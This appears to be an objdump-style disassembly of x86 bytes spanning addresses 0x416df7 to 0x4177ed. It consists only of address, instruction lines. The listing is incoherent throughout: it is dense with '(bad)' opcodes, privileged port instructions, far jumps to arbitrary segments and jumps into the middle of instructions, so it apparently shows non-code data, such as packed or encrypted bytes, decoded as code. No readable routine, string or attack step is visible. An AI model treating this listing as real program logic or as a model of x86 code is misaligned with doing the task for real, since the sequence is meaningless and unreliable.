  416df7:	inc    edi
  416df8:	(bad)
  416dfc:	int3   
  416dfd:	jmp    0x652e:0x505e4b6a
  416e04:	je     0x416da2
  416e06:	jle    0x416e85
  416e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e09:	fbstp  TBYTE PTR [esi+0x1d]
  416e0c:	fistp  DWORD PTR [ecx]
  416e0e:	mov    eax,0xee2d7d98
  416e13:	enter  0x5ad2,0x5d
  416e17:	xchg   DWORD PTR [edx+0xe615038],eax
  416e1d:	inc    ecx
  416e1e:	in     al,dx
  416e1f:	sbb    cl,dl
  416e21:	cmp    ah,BYTE PTR [eax+0x515ae617]
  416e27:	retf   0xebf3
  416e2a:	or     al,0x18
  416e2c:	mov    WORD PTR ds:0xf5457184,gs
  416e32:	mov    eax,ds:0x3597d2e8
  416e37:	shr    edi,1
  416e39:	(bad)  
  416e3a:	bound  esi,QWORD PTR [ebp-0x24914144]
  416e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e41:	icebp  
  416e42:	mov    al,0x3
  416e44:	adc    eax,0xe7ff6f60
  416e49:	xchg   edi,eax
  416e4a:	fs mov ebx,0x94d495c8
  416e50:	mov    ds:0xd134afd5,al
  416e55:	pmulhw mm3,QWORD PTR [edx-0x41a3ead6]
  416e5c:	xor    DWORD PTR [ecx+0x55],edx
  416e5f:	push   es
  416e60:	sti    
  416e61:	mov    esi,0x2ce90d2b
  416e66:	mov    al,ds:0xe984ecb4
  416e6b:	lahf   
  416e6c:	push   edx
  416e6d:	neg    BYTE PTR [ebp+0x479e4b49]
  416e73:	in     eax,0x96
  416e75:	leave  
  416e76:	sar    BYTE PTR [esi],0x3b
  416e79:	mov    eax,ds:0x1744c4bc
  416e7e:	std    
  416e7f:	cmp    eax,0x33be588e
  416e84:	inc    esp
  416e85:	mov    dh,0x6e
  416e87:	mov    ch,0xfd
  416e89:	inc    edi
  416e8a:	or     BYTE PTR [eax+0x58],dh
  416e8d:	dec    ebp
  416e8e:	fmul   st,st(0)
  416e90:	push   eax
  416e91:	xor    eax,0xae032d46
  416e96:	mov    bh,0x5
  416e98:	pusha  
  416e99:	xlat   BYTE PTR ds:[ebx]
  416e9a:	xor    DWORD PTR [edx],ebp
  416e9c:	or     al,BYTE PTR [edi+ebp*8]
  416e9f:	int3   
  416ea0:	mov    al,0x9b
  416ea2:	mov    bh,0xed
  416ea4:	addr16 mov esp,0x34f9121a
  416eaa:	repz test BYTE PTR [ebp-0x1e],dl
  416eae:	in     eax,0xde
  416eb0:	sar    DWORD PTR [ebp+0x65],cl
  416eb3:	cwde   
  416eb4:	and    bh,0x72
  416eb7:	inc    edx
  416eb8:	(bad)  
  416eba:	fdiv   DWORD PTR [edx+edi*2-0x76]
  416ebe:	ret    
  416ebf:	pop    ecx
  416ec0:	pop    es
  416ec1:	add    BYTE PTR [ebx-0x1f346b5c],bl
  416ec7:	fild   DWORD PTR [ecx+0x79]
  416eca:	xor    DWORD PTR [edx],edi
  416ecc:	inc    eax
  416ecd:	jmp    0xbbe6:0xc8526c62
  416ed4:	cld    
  416ed5:	imul   edi,DWORD PTR [ebp+0x5e665192],0x6d50d3ac
  416edf:	push   0xb516c8c5
  416ee4:	mov    eax,ds:0xd0e21759
  416ee9:	adc    DWORD PTR [esi+edx*2-0x3c],0xdfa38bd7
  416ef1:	outs   dx,DWORD PTR ds:[esi]
  416ef2:	and    al,0xea
  416ef4:	cs xchg ebp,eax
  416ef6:	imul   ebx,esi,0x876e7b24
  416efc:	add    DWORD PTR [esi+eax*8],edi
  416eff:	aad    0xa1
  416f01:	sub    DWORD PTR [esi+0x4a],0xffffffe3
  416f05:	and    eax,0xa0b0a9d2
  416f0a:	ret    
  416f0b:	cmp    al,0xf1
  416f0d:	cld    
  416f0e:	xchg   edx,eax
  416f0f:	sbb    eax,0x91fe2b
  416f14:	push   cs
  416f15:	aaa    
  416f16:	pop    esp
  416f17:	out    0x74,eax
  416f19:	cmp    eax,DWORD PTR [ebx]
  416f1b:	mov    ds:0xa0075a46,eax
  416f20:	and    al,0x9c
  416f22:	pop    eax
  416f23:	inc    eax
  416f24:	inc    esp
  416f25:	js     0x416eb1
  416f27:	mov    ebp,0xda8b6912
  416f2c:	lahf   
  416f2d:	out    0xc0,al
  416f2f:	popa   
  416f30:	repnz mov bh,0x95
  416f33:	or     ah,BYTE PTR [ebp-0x23684b23]
  416f39:	mov    bh,BYTE PTR [ecx]
  416f3b:	ins    BYTE PTR es:[edi],dx
  416f3c:	xchg   BYTE PTR [ecx+0x790b5cc0],ah
  416f42:	mov    ebx,0x23882a57
  416f47:	jge    0xcfdab24c
  416f4d:	push   ecx
  416f4e:	fwait
  416f4f:	test   ah,ah
  416f51:	aam    0xc6
  416f53:	stos   BYTE PTR es:[edi],al
  416f54:	cmp    al,0xb9
  416f56:	nop
  416f57:	xchg   edx,eax
  416f58:	mov    ds:0x6065c568,al
  416f5d:	inc    edi
  416f5e:	jae    0x416fb8
  416f60:	jp     0x416f41
  416f62:	mov    ebp,0xfd50cb3f
  416f67:	bound  edi,QWORD PTR [ecx-0x6b]
  416f6a:	loop   0x416fb9
  416f6c:	adc    eax,0x4b444653
  416f71:	call   0x41e139e1
  416f76:	adc    eax,0x89533aac
  416f7b:	pop    es
  416f7c:	arpl   WORD PTR [ecx-0x3d],si
  416f7f:	add    al,BYTE PTR [eax]
  416f81:	push   0xe6ede414
  416f86:	pop    ebp
  416f87:	push   ebp
  416f88:	stc    
  416f89:	mov    ebx,0xc8d08e
  416f8e:	sub    edi,ebp
  416f90:	sub    esp,DWORD PTR [esi+0x2a1e55b8]
  416f96:	bnd jo 0x416f20
  416f99:	inc    esi
  416f9a:	into   
  416f9b:	rcr    BYTE PTR [ecx+esi*8-0x6],0x34
  416fa0:	bound  ebx,QWORD PTR [eax]
  416fa2:	dec    eax
  416fa3:	shl    BYTE PTR [ebp-0x77],1
  416fa6:	adc    eax,0x3574f84a
  416fab:	scas   eax,DWORD PTR es:[edi]
  416fac:	add    DWORD PTR ds:0xd9ad0bb7,0x60
  416fb3:	mov    ebx,0x40bb73bf
  416fb8:	mov    eax,0xe9246034
  416fbd:	inc    ebx
  416fbe:	call   0x4781:0x60f983fe
  416fc5:	xchg   DWORD PTR [edx+0x63],eax
  416fc8:	int    0xed
  416fca:	jb     0x416fd6
  416fcc:	cwde   
  416fcd:	xchg   esp,eax
  416fce:	sbb    al,0x6c
  416fd0:	mov    dh,BYTE PTR [esi+0x471b9597]
  416fd6:	fst    QWORD PTR [ecx+0x1a]
  416fd9:	cmp    bl,BYTE PTR [edi+0x565452ca]
  416fdf:	ds (bad) 
  416fe1:	fdiv   QWORD PTR [edi-0x5da73ea4]
  416fe7:	imul   eax,DWORD PTR [eax],0x1d0cd22
  416fed:	cmp    edx,DWORD PTR [esi]
  416fef:	fbstp  TBYTE PTR [eax-0x9]
  416ff2:	scas   eax,DWORD PTR es:[edi]
  416ff3:	js     0x417020
  416ff5:	push   ebp
  416ff6:	aas    
  416ff7:	and    al,0xb0
  416ff9:	cmp    dh,cl
  416ffb:	inc    ebp
  416ffc:	lock mov al,ds:0x29046685
  417002:	push   cs
  417003:	jo     0x416f89
  417005:	xor    eax,0xf3b4c5b9
  41700a:	sti    
  41700b:	cmp    al,0x7f
  41700d:	jecxz  0x416fc7
  41700f:	or     BYTE PTR [edx-0x44],bl
  417012:	iret   
  417013:	iret   
  417014:	sbb    al,0x30
  417016:	stos   DWORD PTR es:[edi],eax
  417017:	test   al,0x7e
  417019:	adc    eax,DWORD PTR [edx]
  41701b:	scas   eax,DWORD PTR es:[edi]
  41701c:	in     al,0xcd
  41701e:	add    bh,dl
  417020:	cwde   
  417021:	leave  
  417022:	jp     0x416fd0
  417024:	jmp    0x41702b
  417026:	xlat   BYTE PTR ds:[ebx]
  417027:	shr    BYTE PTR [eax-0x52],0x85
  41702b:	cmp    edx,DWORD PTR [ecx+ebp*8-0x31]
  41702f:	icebp  
  417030:	nop
  417031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417032:	jp     0x416fdd
  417034:	(bad)  
  417035:	mov    ch,0xfb
  417037:	fmul   QWORD PTR [ebx+ebx*4]
  41703a:	ret    
  41703b:	dec    ecx
  41703c:	xor    BYTE PTR [esi+0x13ca77df],ah
  417042:	xor    al,dh
  417044:	(bad)
  417047:	push   esi
  417048:	int    0x1
  41704a:	into   
  41704b:	push   ebx
  41704c:	daa    
  41704d:	bound  esp,QWORD PTR [esi]
  41704f:	into   
  417050:	dec    DWORD PTR [ebx+0x5d]
  417053:	(bad)  
  417054:	ins    DWORD PTR es:[edi],dx
  417055:	js     0x416ff3
  417057:	pop    es
  417058:	imul   esi,DWORD PTR [ecx+0x29e06b8a],0xffffff86
  41705f:	or     BYTE PTR [ecx-0x60],cl
  417062:	adc    ebx,DWORD PTR [eax+0x530537c0]
  417068:	dec    edx
  417069:	cmp    BYTE PTR [ebp-0x64],cl
  41706c:	mov    ah,0x5f
  41706e:	xchg   ebx,eax
  41706f:	stc    
  417070:	xchg   BYTE PTR [ebp-0x1e],al
  417073:	dec    edx
  417074:	adc    DWORD PTR [ecx-0x6e],eax
  417077:	je     0x41708b
  417079:	mov    esi,0x24c8e151
  41707e:	xlat   BYTE PTR ds:[ebx]
  41707f:	dec    edx
  417080:	cmp    esp,ecx
  417082:	out    dx,eax
  417083:	lods   al,BYTE PTR ds:[esi]
  417084:	adc    DWORD PTR [ebx+0x702f4625],esp
  41708a:	sub    ch,0xe3
  41708d:	mov    eax,0x3e00a021
  417092:	dec    ebp
  417093:	dec    eax
  417094:	loope  0x41708d
  417096:	mov    ah,0xa7
  417098:	sub    BYTE PTR [edx],al
  41709a:	sub    ah,ah
  41709c:	add    DWORD PTR ds:0xad4ccf90,ebp
  4170a2:	jle    0x41707d
  4170a4:	sbb    al,0xc3
  4170a6:	imul   ebx,ebx,0x75
  4170a9:	stos   BYTE PTR es:[edi],al
  4170aa:	shl    BYTE PTR [edx],0x7
  4170ad:	or     BYTE PTR [edx+0x3d6f0ba8],bl
  4170b3:	sbb    DWORD PTR [ecx-0x579c2505],edx
  4170b9:	(bad)  
  4170ba:	dec    esp
  4170bb:	mov    DWORD PTR ds:0xa5e3a4df,edi
  4170c1:	imul   esi,DWORD PTR [esi+0x43],0x4c61ee35
  4170c8:	mov    al,0xbb
  4170ca:	push   es
  4170cb:	add    al,0x42
  4170cd:	(bad)  ds:0xd266a659
  4170d3:	and    bh,dl
  4170d5:	mov    BYTE PTR [ebp+0x3a],dh
  4170d8:	aad    0x63
  4170da:	call   0xdb9b:0xbe8fd56b
  4170e1:	stos   DWORD PTR es:[edi],eax
  4170e2:	int    0x6b
  4170e4:	aad    0x48
  4170e6:	and    BYTE PTR [ecx+0x1e],0x28
  4170ea:	pop    ss
  4170eb:	and    esi,edi
  4170ed:	inc    ecx
  4170ee:	mov    edi,0x59ee43fa
  4170f3:	retf   
  4170f4:	sbb    ah,BYTE PTR [esi-0x54]
  4170f7:	data16 (bad) 
  4170f9:	mov    eax,0x38515940
  4170fe:	mov    dl,0xf2
  417100:	jle    0x4170fc
  417102:	push   ebp
  417103:	gs pop ds
  417105:	add    al,0xbc
  417107:	or     DWORD PTR [edi-0x50],eax
  41710a:	arpl   WORD PTR [edx-0x6fb6ec49],cx
  417110:	out    0xf2,al
  417112:	mov    ebx,0x3f6b4698
  417117:	frstor [edx-0x5912f6d7]
  41711d:	cmp    BYTE PTR [ecx],dl
  41711f:	outs   dx,DWORD PTR ds:[esi]
  417120:	nop
  417121:	inc    eax
  417122:	arpl   WORD PTR [ebp+0x27ec39b3],cx
  417128:	push   esi
  417129:	push   edx
  41712a:	cmp    cl,ah
  41712c:	cli    
  41712d:	rol    BYTE PTR [ecx+0x27],1
  417130:	lock fisttp QWORD PTR [edx]
  417133:	fldenv [ebx+0x69847bbd]
  417139:	pop    ebx
  41713a:	mov    ah,0x15
  41713c:	xchg   edi,eax
  41713d:	inc    ebp
  41713e:	es add ebp,ebp
  417141:	add    bl,ah
  417143:	mov    edx,0xfbae99d3
  417148:	ror    BYTE PTR [ecx],cl
  41714a:	mov    edi,ebp
  41714c:	push   es
  41714d:	rol    DWORD PTR [edx-0x6ad8846],cl
  417153:	sub    ch,al
  417155:	push   ebx
  417156:	fcomp  DWORD PTR [edx+eiz*1]
  417159:	jbe    0x41716f
  41715b:	cmp    al,BYTE PTR [eax-0x63468593]
  417161:	add    esp,DWORD PTR [ebx+0x1bb61f0e]
  417167:	cdq    
  417168:	jp     0x417139
  41716a:	cmp    BYTE PTR [edi+eiz*8-0xd4cef43],ah
  417171:	inc    esp
  417172:	jns    0x417143
  417174:	add    ebp,edi
  417176:	int3   
  417177:	aas    
  417178:	scas   al,BYTE PTR es:[edi]
  417179:	ss mov ebx,0xe3535a50
  41717f:	or     ebx,DWORD PTR [esi+0x1d]
  417182:	jl     0x417185
  417184:	xlat   BYTE PTR ds:[ebx]
  417185:	mov    al,ds:0x8b98f7fd
  41718a:	add    eax,0xb2697425
  41718f:	shl    cl,1
  417191:	fadd   DWORD PTR [esp+ecx*2+0x4]
  417195:	scas   eax,DWORD PTR es:[edi]
  417196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417197:	add    DWORD PTR [ebp+0x3c],ebp
  41719a:	mov    esi,0xe45d336
  41719f:	pop    ebx
  4171a0:	and    bh,0x4d
  4171a3:	push   esp
  4171a4:	iret   
  4171a5:	inc    BYTE PTR [edx]
  4171a7:	pop    ebp
  4171a8:	ds pushf 
  4171aa:	or     ebp,DWORD PTR [edi-0x25]
  4171ad:	mov    ebp,0x92867e22
  4171b2:	aaa    
  4171b3:	add    DWORD PTR [edx+eiz*8-0x1688abfc],eax
  4171ba:	or     ebx,DWORD PTR [esp+eiz*4]
  4171bd:	imul   esp,eax,0xffffff87
  4171c0:	fadd   QWORD PTR [eax-0x7300ce30]
  4171c6:	out    dx,eax
  4171c7:	ror    BYTE PTR [esi-0x49126982],1
  4171cd:	jmp    0xcffd:0x66ae1ea5
  4171d4:	rol    cl,cl
  4171d6:	mov    bl,0x1e
  4171d8:	in     eax,dx
  4171d9:	stc    
  4171da:	je     0x41724e
  4171dc:	clc    
  4171dd:	cmp    esp,esp
  4171df:	or     eax,0x68ec59f1
  4171e4:	fimul  DWORD PTR [eax]
  4171e6:	dec    eax
  4171e7:	sbb    esi,DWORD PTR [esi+0x6f3bce7d]
  4171ed:	retf   0x4a21
  4171f0:	push   ebp
  4171f1:	and    al,0x47
  4171f3:	iret   
  4171f4:	adc    al,al
  4171f6:	sub    eax,0x5815d4cc
  4171fb:	mov    eax,ds:0x8bd5b5d9
  417200:	mov    eax,ds:0x67fb318e
  417205:	out    0xf9,al
  417207:	xor    esp,DWORD PTR [edi-0x55]
  41720a:	imul   edi,DWORD PTR [ebx],0x54
  41720d:	iret   
  41720e:	sbb    BYTE PTR [ebx],ch
  417210:	xchg   BYTE PTR [edi+0x5a],ah
  417213:	sbb    eax,0xdaaa969f
  417218:	xchg   ecx,eax
  417219:	and    al,0x4e
  41721b:	push   esi
  41721c:	scas   eax,DWORD PTR es:[edi]
  41721d:	data16 lahf 
  41721f:	jmp    0x417276
  417221:	das    
  417222:	fcomp  DWORD PTR [esi-0x57]
  417225:	in     eax,dx
  417226:	inc    ecx
  417227:	sub    ah,BYTE PTR [edx+0x49]
  41722a:	pop    eax
  41722b:	out    0x92,al
  41722d:	retf   0x2c12
  417230:	test   BYTE PTR [edx+0x69],bl
  417233:	(bad)
  417236:	mov    ds:0x9e8c2440,eax
  41723b:	inc    edi
  41723c:	hlt    
  41723d:	and    eax,0xde1c3fe2
  417242:	and    DWORD PTR [edi+ecx*8-0x3287ce86],edi
  417249:	repnz dec eax
  41724b:	dec    esi
  41724c:	addr16 dec esi
  41724e:	test   eax,0xc1d973b9
  417253:	xor    bl,BYTE PTR [ebp+0x54]
  417256:	in     eax,0x37
  417258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417259:	dec    ecx
  41725a:	icebp  
  41725b:	sbb    al,0x49
  41725d:	xchg   edx,eax
  41725e:	lds    esp,FWORD PTR [ecx]
  417260:	test   al,0xdd
  417262:	and    ebx,DWORD PTR ds:[ebp-0x73]
  417266:	cmp    al,0x54
  417268:	xor    eax,0x76261cd7
  41726d:	push   ebp
  41726e:	jl     0x417226
  417270:	out    0x83,al
  417272:	inc    ecx
  417273:	mov    ebp,0xc74c421b
  417278:	(bad)  
  417279:	rol    edi,cl
  41727b:	or     esi,DWORD PTR [edx]
  41727d:	inc    edi
  41727e:	xchg   edi,eax
  41727f:	mov    ebp,0xe765e829
  417284:	add    bl,bl
  417286:	jecxz  0x4172b6
  417288:	inc    ebp
  417289:	cmp    dl,BYTE PTR [eax-0x11]
  41728c:	xchg   edx,eax
  41728d:	lods   eax,DWORD PTR ds:[esi]
  41728e:	loopne 0x417248
  417290:	pop    esp
  417291:	dec    ebx
  417292:	inc    esi
  417293:	xchg   esi,eax
  417294:	aad    0x4b
  417296:	jae    0x417291
  417298:	jmp    0x417250
  41729a:	call   esi
  41729c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41729d:	pop    edx
  41729e:	or     DWORD PTR [edi+0x18],ebp
  4172a1:	or     eax,0xfc94c98c
  4172a6:	gs call 0x3ad2260b
  4172ac:	and    BYTE PTR [eax+0x73fea2ac],0x48
  4172b3:	je     0x417253
  4172b5:	mov    ebx,0x468c3ef
  4172ba:	xchg   ebp,eax
  4172bb:	pop    ss
  4172bc:	pushf  
  4172bd:	add    dh,ch
  4172bf:	rcr    DWORD PTR [ebx+0x63],1
  4172c2:	sbb    BYTE PTR ds:0xb8e8c183,dl
  4172c8:	cwde   
  4172c9:	cmp    esi,DWORD PTR [ecx]
  4172cb:	test   bh,al
  4172cd:	xchg   edi,eax
  4172ce:	mov    bl,0x8d
  4172d0:	call   0x230c:0xd88d9461
  4172d7:	jl     0x4172bf
  4172d9:	pop    esi
  4172da:	push   esp
  4172db:	add    eax,0xdbab76b7
  4172e0:	call   DWORD PTR [ebx]
  4172e2:	in     eax,0x74
  4172e4:	pop    ebp
  4172e5:	mov    eax,ds:0xc2bc0b1f
  4172ea:	mov    ebx,0xfecab70c
  4172ef:	inc    edx
  4172f0:	fbstp  TBYTE PTR [ebx+0x7e]
  4172f3:	xchg   esp,eax
  4172f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172f5:	xlat   BYTE PTR ds:[ebx]
  4172f6:	xor    ebp,esp
  4172f8:	(bad)  [edx-0x3fe26bf1]
  4172fe:	jo     0x4172be
  417300:	xor    al,0x3b
  417302:	or     BYTE PTR [ebx-0x54e9ebc0],0x8
  417309:	pop    ebp
  41730a:	ins    DWORD PTR es:[edi],dx
  41730b:	loope  0x417299
  41730d:	adc    al,0x8
  41730f:	cld    
  417310:	(bad)  
  417311:	fxch   st(1)
  417313:	iret   
  417314:	or     cl,BYTE PTR [eax+0x62]
  417317:	stc    
  417318:	shl    DWORD PTR [ecx+0x5329ff43],0x4b
  41731f:	out    dx,eax
  417320:	imul   edx,DWORD PTR [edi+0x5912d684],0xace54a5f
  41732a:	or     edx,ecx
  41732c:	add    DWORD PTR [ecx-0x56cc0341],0xffffffd7
  417333:	jmp    0xb14fd10d
  417338:	xor    edi,DWORD PTR [ecx]
  41733a:	jmp    0x3cc5:0xaf288692
  417341:	mov    dl,0x1e
  417343:	adc    eax,DWORD PTR [esi]
  417345:	push   ds
  417346:	dec    esi
  417347:	mov    esp,0x99d35144
  41734c:	jo     0x4172dd
  41734e:	ins    DWORD PTR es:[edi],dx
  41734f:	retfw  0xcc3f
  417353:	pop    ss
  417354:	push   esp
  417355:	mov    esp,0x1e94e81a
  41735a:	fsubr  QWORD PTR [ebx-0x5775a81f]
  417360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417361:	fs js  0x417366
  417364:	mov    DWORD PTR [eax+esi*1],0x1fa6efe1
  41736b:	test   eax,0x85c43a15
  417370:	js     0x417391
  417372:	pushf  
  417373:	and    eax,0x5ec48bb7
  417378:	adc    al,0x90
  41737a:	stc    
  41737b:	xor    DWORD PTR [ebx+0x41],ecx
  41737e:	add    DWORD PTR [ebp-0x42],edi
  417381:	paddb  mm7,QWORD PTR [ecx+0x4e90cc9c]
  417388:	pop    edi
  417389:	sbb    esi,ebx
  41738b:	inc    edi
  41738c:	mov    eax,ds:0x99b634a3
  417391:	and    BYTE PTR [ebx+0x1b],cl
  417394:	test   BYTE PTR [eax+0x63cc3deb],cl
  41739a:	in     eax,0x5c
  41739c:	mov    bl,0xdb
  41739e:	sahf   
  41739f:	(bad)  
  4173a0:	mov    eax,ds:0xc1b62b09
  4173a5:	loope  0x4173bd
  4173a7:	out    dx,eax
  4173a8:	aas    
  4173a9:	ins    DWORD PTR es:[edi],dx
  4173aa:	les    ecx,FWORD PTR [eax+0x5d]
  4173ad:	pop    ebp
  4173ae:	cdq    
  4173af:	push   edx
  4173b0:	jmp    FWORD PTR [ebp-0xa]
  4173b3:	addr16 jnp 0x41742f
  4173b6:	aaa    
  4173b7:	fdivr  QWORD PTR ds:0x8956a1a9
  4173bd:	push   esi
  4173be:	mov    esi,0xd5e11f0a
  4173c3:	cli    
  4173c4:	xor    DWORD PTR [ebx-0x3e3c5aa],ebp
  4173ca:	pop    ss
  4173cb:	mov    ds:0xbdb9212c,eax
  4173d0:	mov    dl,0x2e
  4173d2:	jge    0x41735f
  4173d4:	(bad)  
  4173d5:	xlat   BYTE PTR ds:[ebx]
  4173d6:	mov    al,0x1a
  4173d8:	mov    esp,0x34ba6fc3
  4173dd:	out    dx,al
  4173de:	jbe    0x4173b4
  4173e0:	jnp    0x41736b
  4173e2:	mov    dl,0x74
  4173e4:	sar    cl,0x80
  4173e7:	repz push edx
  4173e9:	clc    
  4173ea:	fild   DWORD PTR [ecx]
  4173ec:	aaa    
  4173ed:	and    DWORD PTR [ebx],edx
  4173ef:	leave  
  4173f0:	test   edi,eax
  4173f2:	pop    edi
  4173f3:	rcl    BYTE PTR [esi-0x63c28846],cl
  4173f9:	bound  eax,QWORD PTR [eax-0x21721c3a]
  4173ff:	(bad)  
  417401:	mov    ds:0xd29efc18,al
  417406:	adc    ebx,DWORD PTR [edi]
  417408:	into   
  417409:	pop    edi
  41740a:	neg    DWORD PTR [edx]
  41740c:	mov    al,0xc8
  41740e:	call   0xf3dcf535
  417413:	fld    TBYTE PTR [edi-0x386dc200]
  417419:	bound  ebp,QWORD PTR [ecx+0x7991a797]
  41741f:	add    eax,0x70e81730
  417424:	mov    cs,WORD PTR [edx]
  417426:	in     eax,0x91
  417428:	in     eax,dx
  417429:	xor    DWORD PTR [edi+0x22],esp
  41742c:	(bad)  
  41742d:	cmp    eax,0x825cc10f
  417432:	jmp    0x417406
  417434:	inc    ebx
  417435:	jo     0x417474
  417437:	lahf   
  417438:	xor    eax,0x49a8e0fc
  41743d:	daa    
  41743e:	add    eax,0x9846c1ec
  417443:	fiadd  DWORD PTR [esp+esi*8-0x61bf1d3e]
  41744a:	mov    bl,0xb5
  41744c:	or     edi,ecx
  41744e:	inc    ebp
  41744f:	jo     0x4173e7
  417451:	pop    esp
  417452:	push   ebp
  417453:	mov    al,ds:0x7ac1d20c
  417458:	js     0x41747d
  41745a:	ss cwde 
  41745c:	pop    ds
  41745d:	leave  
  41745e:	mul    BYTE PTR [edi]
  417460:	adc    ch,BYTE PTR [ebx+eiz*2]
  417463:	loope  0x4173ee
  417465:	xchg   esi,eax
  417466:	dec    esi
  417467:	jmp    0x417444
  417469:	pop    ecx
  41746a:	xchg   ecx,eax
  41746b:	clc    
  41746c:	iret   
  41746d:	inc    ebp
  41746e:	test   cl,al
  417470:	sbb    eax,0x4e8730c
  417475:	cmp    edi,DWORD PTR [edx+0x4d]
  417478:	add    dh,BYTE PTR [esi+0x31]
  41747b:	pop    edx
  41747c:	(bad)  
  41747e:	pusha  
  41747f:	jp     0x417407
  417481:	out    0x2a,al
  417483:	cmp    BYTE PTR [esi+edx*4+0x4bf3021b],dh
  41748a:	adc    al,0xa8
  41748c:	rcr    BYTE PTR [eax-0x1ad7f5cf],0x99
  417493:	jb     0x417450
  417495:	pop    edi
  417496:	adc    eax,0xdc33af71
  41749b:	jmp    0x4174c6
  41749d:	mov    ds:0x7e2162d9,al
  4174a2:	cmp    BYTE PTR [edi+0x1343c812],dh
  4174a8:	enter  0x572,0xb9
  4174ac:	or     eax,0x57ef3371
  4174b1:	push   ecx
  4174b2:	fsub   st(6),st
  4174b4:	shl    BYTE PTR [ecx],0xe
  4174b7:	inc    ebx
  4174b8:	mov    edx,0x54eff596
  4174bd:	mov    ch,0x58
  4174bf:	pop    ebx
  4174c0:	popa   
  4174c1:	leave  
  4174c2:	(bad)  
  4174c3:	mov    ebp,edi
  4174c5:	jns    0x417492
  4174c7:	mov    edi,0x84b6c1d
  4174cc:	paddb  mm3,QWORD PTR [edi]
  4174cf:	push   esp
  4174d0:	lahf   
  4174d1:	bound  esi,QWORD PTR [ecx-0x6f]
  4174d4:	ficom  DWORD PTR [ebp+0x59]
  4174d7:	or     al,0x5a
  4174d9:	daa    
  4174da:	dec    edi
  4174db:	in     eax,0x18
  4174dd:	inc    ebx
  4174de:	push   ecx
  4174df:	sub    eax,0xd74ee2a8
  4174e4:	mov    dl,BYTE PTR [edi+0x4f]
  4174e7:	xchg   dh,bh
  4174e9:	add    eax,DWORD PTR [esi]
  4174eb:	into   
  4174ec:	push   ds
  4174ed:	mov    ebx,0x7f3580b8
  4174f2:	imul   ecx
  4174f4:	mov    eax,ds:0x156bb61
  4174f9:	mov    ah,0x11
  4174fb:	or     bl,BYTE PTR [eax+0x2bbd0733]
  417501:	pop    ss
  417502:	xchg   edx,eax
  417503:	lods   al,BYTE PTR ds:[esi]
  417504:	nop
  417505:	scas   al,BYTE PTR es:[edi]
  417506:	jne    0x41750d
  417508:	or     eax,DWORD PTR ds:0x5a
	...
  4176da:	add    BYTE PTR [edi-0x126a5a8a],bh
  4176e0:	xlat   BYTE PTR ds:[ebx]
  4176e1:	mov    edi,0xa0a36c7e
  4176e6:	shr    BYTE PTR [ecx+0x5d2cd723],0xf8
  4176ed:	add    DWORD PTR [eax],eax
  4176ef:	and    eax,0xa4000007
  4176f4:	stc    
  4176f5:	push   ebx
  4176f6:	pop    edx
  4176f7:	or     al,0x4a
  4176f9:	inc    ebp
  4176fa:	sti    
  4176fb:	add    esp,ebp
  4176fd:	mov    al,BYTE PTR [ebx]
  4176ff:	sub    esi,DWORD PTR [eax+0x19ac1e58]
  417705:	adc    al,0xed
  417707:	or     al,0xec
  417709:	pop    esi
  41770a:	cmp    BYTE PTR [ecx-0x70643c2],cl
  417710:	das    
  417711:	mov    ch,0x43
  417713:	or     al,0xea
  417715:	adc    ecx,DWORD PTR [esi]
  417717:	(bad)  [edx+0x575d7d41]
  41771d:	and    eax,0x5d2b3c3d
  417722:	in     eax,0x25
  417724:	mov    bh,0x90
  417726:	mov    edx,0xa97ad422
  41772b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41772c:	call   0x5ff69967
  417731:	stos   DWORD PTR es:[edi],eax
  417732:	push   eax
  417733:	ret    0x5a43
  417736:	in     al,0x1
  417738:	mov    edi,edi
  41773a:	je     0x417764
  41773c:	fcom   QWORD PTR [ebx-0x61378719]
  417742:	(bad)  
  417743:	cmc    
  417744:	xor    eax,esi
  417746:	cmp    BYTE PTR fs:[edx-0x13f96ca8],bh
  41774d:	rcl    DWORD PTR [ebx-0x33977073],0x8a
  417754:	sub    ch,BYTE PTR [edi+0x898bb3b]
  41775a:	outs   dx,BYTE PTR ds:[esi]
  41775b:	fisub  WORD PTR [edi+0x6]
  41775e:	rol    DWORD PTR [ecx+0x63eba474],1
  417764:	inc    ebx
  417765:	mov    dh,0xeb
  417767:	cmp    DWORD PTR [ecx-0x54c82d80],ebx
  41776d:	jne    0x417729
  41776f:	loope  0x4177aa
  417771:	loop   0x4177b0
  417773:	mul    BYTE PTR [esi]
  417775:	sbb    eax,0xf22d6551
  41777a:	rcl    DWORD PTR [eax-0x47b68fc0],cl
  417780:	mov    eax,0xf164f439
  417785:	cwde   
  417786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417787:	and    bh,ah
  417789:	sbb    eax,0xb91b78cf
  41778e:	popa   
  41778f:	sbb    DWORD PTR [eax-0x4785c813],eax
  417795:	mov    di,0x6250
  417799:	add    BYTE PTR [edi-0x14],ch
  41779c:	inc    eax
  41779d:	lods   eax,DWORD PTR ds:[esi]
  41779e:	shr    DWORD PTR [ecx+eiz*4],cl
  4177a1:	xchg   edx,eax
  4177a2:	dec    esp
  4177a3:	jecxz  0x417767
  4177a5:	push   cs
  4177a6:	cld    
  4177a7:	adc    eax,0x1680fbcd
  4177ac:	(bad)  
  4177ad:	repz push 0xabf719a
  4177b3:	add    al,0xd7
  4177b5:	mov    ebp,0x1ad99064
  4177ba:	cmc    
  4177bb:	ret    
  4177bc:	dec    edx
  4177bd:	cmp    DWORD PTR [edx+0x34ad7cc2],edi
  4177c3:	rol    DWORD PTR [edi],0x81
  4177c6:	je     0x417805
  4177c8:	out    dx,al
  4177c9:	bound  esp,QWORD PTR [ecx-0x29f02954]
  4177cf:	shr    BYTE PTR [eax-0x46306d48],cl
  4177d5:	mov    ah,0x1d
  4177d7:	xor    eax,0x681bee07
  4177dc:	add    al,0x10
  4177de:	jae    0x4177c8
  4177e0:	call   0xc1bf:0x3eaa0a03
  4177e7:	mov    al,0xe0
  4177e9:	(bad)  
  4177eb:	daa    
  4177ec:	push   ebx
  4177ed:	xor    bh,BYTE PTR [ecx]
